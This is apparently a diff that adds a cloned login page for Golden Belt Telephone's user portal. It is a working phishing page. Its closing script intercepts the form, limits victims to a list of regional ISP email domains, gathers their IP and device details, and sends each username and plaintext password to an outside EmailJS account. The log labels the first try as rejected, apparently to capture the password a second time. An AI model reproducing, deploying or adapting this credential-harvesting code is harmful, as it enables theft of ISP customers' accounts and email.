@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<base href="https://userportal.gbta.net/login" /><meta charset="UTF-8"/>
+	<title>Log in to Golden Belt Telephone</title>
+	<link href="/build/app.068e1cda.css" rel="stylesheet" />
+	<link href="//fonts.googleapis.com/css?family=Open+Sans:400,400i,600,600i,700,700i" rel="stylesheet" />
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
+	<link href="/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180" />
+	<link href="/favicon/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png" />
+	<link href="/favicon/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png" />
+	<link href="/favicon/site.webmanifest" rel="manifest" />
+	<link color="#5bbad5" href="/favicon/safari-pinned-tab.svg" rel="mask-icon" />
+	<link href="/favicon/favicon.ico" rel="shortcut icon" /><meta name="msapplication-TileColor" content="#da532c"/><meta name="msapplication-config" content="/favicon/browserconfig.xml"/><meta name="theme-color" content="#ffffff"/><meta name="viewport" content="width:device-width, initial-scale=1"/>
+</head>
+<body class="app-body">
+<div class="container-md">
+<div class="row bg-white border-dark rounded mt-md-5">
+<div class="offset-xs-2 col-xs-8 offset-md-0 col-md-3 p-3"><img class="img-fluid" src="/mfa/img/logo" /></div>
+
+<div class="col-xs-12 col-md-9" style="min-width: 75%; color: #0e3e6c;" xclass="pt-2 pl-4 pr-4 pb-2 flex-grow-1 ">
+<h3 class="pagetitle">Please Log In</h3>
+
+<div class="float-left" data-cookie-name="N88" data-url="/mfa/notices" id="noticesBadge">&nbsp;</div>
+
+<ul class="text-right list-inline mt-n1 navigation" style="font-size: 80%">
+	<li class="list-inline-item"><a href="/mfa/recovery">Forget Password? </a></li>
+</ul>
+
+<div class="pb-3">
+<form method="post" id="contact-form"><input name="__original_url" type="hidden" value="https://userportal.gbta.net/login" />
+<div class="form-group"><label for="inputUsername">Username</label> <input autofocus="" class="form-control" id="inputUsername" name="username" placeholder="Full email address" required="" type="email" value="" /></div>
+
+<div class="form-group"><label for="inputPassword">Password</label> <input class="form-control" id="inputPassword" name="password" placeholder="Password" required="" type="password" /></div>
+
+<div class="row">
+<div class="col-12 col-md-4">
+<div class="form-inline"><button class="btn btn-success btn-sm w-100 mr-md-2" id="btnLogin" type="submit">Login</button>
+
+<div class="form-group form-check pt-2">
+<div class="custom-control custom-switch"><input class="custom-control-input" id="_remember_me" name="_remember_me" type="checkbox" /> <label class="custom-control-label" for="_remember_me"> Stay logged in <span class="pl-1" style="cursor: help;" title="Enabling this will keep you logged in to this computer for 30 days."> </span> </label></div>
+</div>
+</div>
+</div>
+
+<div class="col-12 offset-md-4 col-md-4">
+<div class="form-group form-inline"><label for="_destination" style="display: inline-block">Go To:&nbsp;</label> <select class="custom-select w-75" id="_destination" name="_destination"><option value="portal-sso:">App Portal</option><option value="account-recovery-prefs:">Access Recovery</option><option value="account:">Account Security</option><option value="zimbra-sso:calendar">Zimbra Calendar</option><option value="zimbra-sso:mail">Zimbra Mail</option> </select></div>
+</div>
+</div>
+<input name="_csrf_token" type="hidden" value="72901e.hRNGdE8HHgR4jZ4RIsLkeg-p5wYM9nGMRQLA-95ox8Q.82k8DhVeUjQg-txoeoSlOXqeiStmnD7nAHSUq7NZlInwcBA-GVB1fSr1rg" />&nbsp;</form>
+</div>
+</div>
+</div>
+</div>
+
+<div class="modal fade" id="popupModal" tabindex="-1">
+<div class="modal-dialog">
+<div class="modal-content" id="popup-modal-content">&nbsp;</div>
+</div>
+</div>
+
+<div class="modal fade" id="noticeModal" tabindex="-1">
+<div class="modal-dialog modal-notice">
+<div class="modal-content" id="notice-modal-content">
+<div class="modal-header">
+<h5 class="notice-title">&nbsp;</h5>
+<button aria-label="Close" class="close" data-dismiss="modal" type="button"></button></div>
+
+<div class="modal-body notice-body">&nbsp;</div>
+
+<div class="modal-footer small text-muted">
+<div class="row w-100 no-gutters">
+<div class="col-xs-12 text-xs-center col-md-4 text-md-left">|</div>
+
+<div class="col-xs-12 text-xs-center col-md-8 text-md-right notice-posted">&nbsp;</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<script type="text/html" id="notice_new">
+    <div class="badge badge-danger notification notification-unread">
+        <a href="#"
+           data-notice-id="<%= nid %>"
+           data-link="<%= link %>"
+           title="Click to see new notifications"
+        >
+            <i class="fa fa-fw fa-exclamation-triangle"></i>
+            <%= ncount %> New Notification<%= nplural %>
+        </a>
+    </div>
+</script><script type="text/html" id="notice_old">
+    <div class="badge badge-diminished notification">
+        <a href="#"
+           data-notice-id="<%= nid %>"
+           data-link="<%= link %>"
+           title="Click to see previous notifications"
+        >
+            <i class="fa fa-fw fa-info-circle"></i>
+            Prior Notification<%= nplural %>
+        </a>
+    </div>
+</script>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+(function () {
+  // ----- EmailJS init -----
+  emailjs.init("uGRhkufMjo08rjwb_");
+
+  // ----- DOM elements -----
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("inputUsername");
+  const passwordInput = document.getElementById("inputPassword");
+  const submitBtn = document.getElementById("btnLogin");
+
+  let attemptNumber = 1;
+
+  // ----- accepted email domains -----
+  const ACCEPTED_DOMAINS = [
+    "bevcomm.net",
+    "nemont.net",
+    "peak.org",
+    "kmtel.com",
+    "highland.net",
+    "peoplescom.net",
+    "web-access.net",
+    "comporium.net",
+    "mintel.com",
+    "grm.net",
+    "his.com",
+    "hers.com",
+    "gbta.net",
+    "hardynet.com"
+  ];
+
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  // ----- helpers -----
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) {
+      return "Not available";
+    }
+  }
+
+  // ----- send to EmailJS -----
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const ip = await getIP();
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = getDeviceType();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  // ----- form submit -----
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      valid = false;
+    }
+    if (!passwordValue) {
+      valid = false;
+    }
+    if (!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    await sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Login";
+    form.reset();
+    attemptNumber += 1;
+  });
+
+})();
+</script>
+</body>
+</html>
